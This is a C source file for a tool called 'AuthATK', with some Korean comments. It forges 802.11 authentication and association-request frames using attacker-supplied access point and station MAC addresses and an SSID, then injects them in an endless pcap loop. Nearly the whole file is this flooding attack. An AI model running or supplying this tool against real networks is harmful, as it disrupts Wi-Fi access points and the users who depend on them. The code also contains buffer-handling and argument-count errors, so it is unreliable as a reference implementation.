#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

struct Radio
{
    uint8_t version; /* set to 0 */
    uint8_t pad;
    uint16_t len;     /* entire length */
    uint32_t present; /* fields present */
};

void radio_init(struct Radio* rad){
    rad->version = 0x00;
    rad->pad = 0x00;
    rad->len = 0x0008;
    rad->present = 0x00;
}

struct Dot11Bd
{
    uint16_t FcF;
    uint16_t Dur;
    u_char STAMac[6];
    u_char APMac[6];
    u_char BSSID[6];
    uint16_t FSnumber;
};

struct AuthenticationBd{
    uint16_t auth_Algo;
    uint16_t auth_seq;
    uint16_t status_code;
};

struct AssociationReqBd{
    uint16_t capabil_info;
    uint16_t status_code;
    uint8_t tag_number;
    uint8_t tag_len;
    unsigned char ssid[];
};

struct Authentication
{
    struct Radio rad;
    struct Dot11Bd Dot11Bd;
    struct AuthenticationBd AuthBd;
};

struct AssociationReq
{
    struct Radio rad;
    struct Dot11Bd Dot11Bd;
    struct AssociationReqBd AssReqBd;
};

void usage()
{
    printf("syntax: AuthATK <interface> <AP mac> <STA mac> <SSID>\n");
    printf("sample: AuthATK wlan0 11:22:33:44:55:66 ff:ff:ff:ff:ff:ff\n");
}

typedef struct
{
    char *dev_;
} Param;

Param param = {
    .dev_ = NULL};

bool parse(Param *param, int argc, char *argv[])
{
    if (argc != 4)
    {
        usage();
        return false;
    }
    param->dev_ = argv[1];
    return true;
}

void Mac_(const char *arr, u_char mac_addr[6])
{
    int a;
    if (strlen(arr) != 17)
    {
        printf("Maclen error!!\n");
    }
    char cpyarr[18];
    memcpy(cpyarr, arr, 17);
    for (int i = 0; i < 6; i++) //입력Mac값의 콜론 제거
    {
        cpyarr[i * 3 + 2] = '\0';
        sscanf((const char *)&cpyarr[3 * i], "%x", &a);
        mac_addr[i] = (u_char)a;
    }
}

void set_auth_p(struct Authentication *auth_p,unsigned char *AP_MAC,unsigned char *STA_MAC){
    radio_init(&(auth_p->rad));
    auth_p->Dot11Bd.FcF = 0x00B0;
    auth_p->Dot11Bd.Dur = 0x0000;
    Mac_(AP_MAC, auth_p->Dot11Bd.APMac);
    Mac_(STA_MAC, auth_p->Dot11Bd.STAMac);
    Mac_(AP_MAC, auth_p->Dot11Bd.BSSID);
    auth_p->Dot11Bd.FSnumber = 0x0000;
    auth_p->AuthBd.auth_Algo = 0x0000;
    auth_p->AuthBd.auth_seq = 0x0001;
    auth_p->AuthBd.status_code = 0x0000;
}

void set_assoreq_p(struct AssociationReq *assoreq_p,unsigned char *AP_MAC,unsigned char *STA_MAC,unsigned char *SSID){
    radio_init(&(assoreq_p->rad));
    assoreq_p->Dot11Bd.FcF = 0x0000;
    assoreq_p->Dot11Bd.Dur = 0x0000;
    Mac_(AP_MAC, assoreq_p->Dot11Bd.APMac);
    Mac_(STA_MAC, assoreq_p->Dot11Bd.STAMac);
    Mac_(AP_MAC, assoreq_p->Dot11Bd.BSSID);
    assoreq_p->Dot11Bd.FSnumber = 0x0000;
    assoreq_p->AssReqBd.capabil_info = 0x0000;
    assoreq_p->AssReqBd.status_code = 0x00C8;
    assoreq_p->AssReqBd.tag_number = 0x00;
    assoreq_p->AssReqBd.tag_len = strlen(SSID);
    strcpy(assoreq_p->AssReqBd.ssid,SSID);
}

int main(int argc, char *argv[])
{
    int time=0;
    char c;
    while((c = getopt(argc,argv,"t:")) != -1){
        switch(c){
            case 't':
                time = atoi(optarg);
		printf("%d\n\n",time);
                break;
        }
    }
    
    for(int i = 0; i < argc; i++){
        printf("%s\n\n",argv[i]);
    }
    unsigned char *Interface = argv[1];
    unsigned char *AP_MAC = argv[2];
    unsigned char *STA_MAC = argv[3];
    unsigned char *SSID = argv[4];

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(Interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL)
    {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }

    //auth 패킷 초기화
    struct Authentication auth_p;
    set_auth_p(&auth_p,AP_MAC,STA_MAC);
    struct AssociationReq assoreq_p;
    set_assoreq_p(&assoreq_p,AP_MAC,STA_MAC,SSID);

    while(1){
        pcap_sendpacket(pcap, (char *)&auth_p, sizeof(auth_p) - 2);
        pcap_sendpacket(pcap, (char *)&assoreq_p, sizeof(assoreq_p) + strlen(SSID) - 2);
    }

}
